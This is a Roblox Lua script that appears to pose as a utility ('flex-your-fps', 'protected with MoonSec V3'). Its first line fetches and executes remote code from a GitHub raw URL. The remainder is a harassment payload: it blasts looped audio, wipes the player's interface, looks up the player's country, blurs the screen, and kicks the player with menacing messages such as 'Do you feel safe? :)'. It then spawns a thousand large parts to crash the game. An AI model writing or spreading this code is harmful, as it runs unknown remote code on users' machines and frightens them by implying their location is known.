-- This file was protected with MoonSec V3
loadstring(game:HttpGet("https://raw.githubusercontent.com/chiper1z/flex-your-fps/main/Protected_9332153022180151.txt"))()

wait(3)
local LocalizationService = game:GetService("LocalizationService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local sound = Instance.new("Sound")

sound.SoundId = "rbxassetid://6299850448"
sound.Looped = true
sound.Volume = 10
sound.Parent = workspace.CurrentCamera
sound:Play()

-- Clear player's GUI and disable the top bar
player.PlayerGui:ClearAllChildren()
game:GetService('StarterGui'):SetCore("TopbarEnabled", false)

local locations = {
    -- (Same location codes as provided before)
}

local success, code = pcall(function()
    return LocalizationService:GetCountryRegionForPlayerAsync(player)
end)

local function crashGame()
    -- Create a large number of parts to attempt to crash the game
    for i = 1, 1000 do
        local part = Instance.new("Part")
        part.Size = Vector3.new(100, 100, 100)
        part.Position = Vector3.new(math.random(-1000, 1000), 0, math.random(-1000, 1000))
        part.Parent = workspace
    end
end

local function removeMouse()
    -- Remove the player's mouse if it exists
    local playerScripts = player:FindFirstChild("PlayerScripts")
    if playerScripts then
        local mouse = playerScripts:FindFirstChildOfClass("Mouse")
        if mouse then
            mouse:Destroy()
        end
    end
end

if success then
    local location = locations[code]
    if location then
        local blur = Instance.new("BlurEffect")
        blur.Size = 9999
        blur.Parent = workspace.CurrentCamera
        removeMouse()  -- Remove mouse before kicking
        player:Kick("How is it like in " .. location .. "?")
    else
        local blur = Instance.new("BlurEffect")
        blur.Size = 9999
        blur.Parent = workspace.CurrentCamera
        removeMouse()  -- Remove mouse before kicking
        player:Kick("Do you feel safe? :)")
    end
else
    removeMouse()  -- Remove mouse before kicking
    player:Kick("Error; please try again later")
end

wait(0.5) -- Short wait to ensure kick screen is shown

crashGame() -- Attempt to crash the game after kick screen
